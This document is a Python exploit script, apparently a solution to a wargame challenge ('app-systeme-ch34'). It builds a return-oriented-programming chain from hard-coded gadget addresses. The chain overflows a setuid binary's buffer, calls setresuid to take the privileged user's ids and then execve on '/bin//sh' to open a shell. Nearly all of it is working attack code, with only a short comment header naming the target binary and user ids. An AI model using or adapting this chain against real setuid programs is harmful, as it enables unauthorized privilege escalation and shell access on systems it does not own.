'''
$ls -ahl ch34
-rwsr-x--- 1 app-systeme-ch34-cracked app-systeme-ch34 857K mai   16  2015 ch34

$ id
uid=1134(app-systeme-ch34) gid=1134(app-systeme-ch34) groups=1134(app-systeme-ch34),100(users)

$ id app-systeme-ch34-cracked
uid=1234(app-systeme-ch34-cracked) gid=1234(app-systeme-ch34-cracked) groups=1234(app-systeme-ch34-cracked),100(users)

http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

sys_setresuid(1234,1234,1234) sys_execve(/bin//sh)
'''


from struct import pack
import sys

stack     = pack("<Q", 0x00000000006c1be0)  # .data
move      = pack("<Q", 0x0000000000467b51)  # mov qword ptr [rsi], rax | ret
pop_a     = pack('<Q', 0x000000000044d2b4)  # pop rax | ret
pop_s     = pack('<Q', 0x00000000004017e7)  # pop rsi | ret
pop_d     = pack('<Q', 0x0000000000437205)  # pop rdx | ret
pop_rdi   = pack('<Q', 0x00000000004016d3)  # pop rdi | ret
xor_a     = pack('<Q', 0x000000000041bd9f)  # xor rax, rax | ret
add_      = pack('<Q', 0x000000000045aa10)  # add rax, 1 ; ret
zero_     = pack('<Q', 0x00000000006c1bf6)  # zero
sys_      = pack('<Q', 0x0000000000400488)  # syscall
buf = ''
buf += 'A' * 280

buf += xor_a
buf += add_ * 117
buf += pop_rdi
buf += pack('<Q', 0x00000000000004d2)
buf += pop_d
buf += pack('<Q', 0x00000000000004d2)
buf += pop_s
buf += pack('<Q', 0x00000000000004d2)
buf += sys_

buf += ("A" * 1536 + "B" * 24)

buf += xor_a
buf += pop_s
buf += stack
buf += pop_a
buf += '/bin//sh'
buf += move
buf += xor_a
buf += pop_d
buf += zero_
buf += pop_rdi
buf += stack
buf += pop_s
buf += zero_
buf += add_ * 59
buf += sys_

sys.stdout.write(buf)
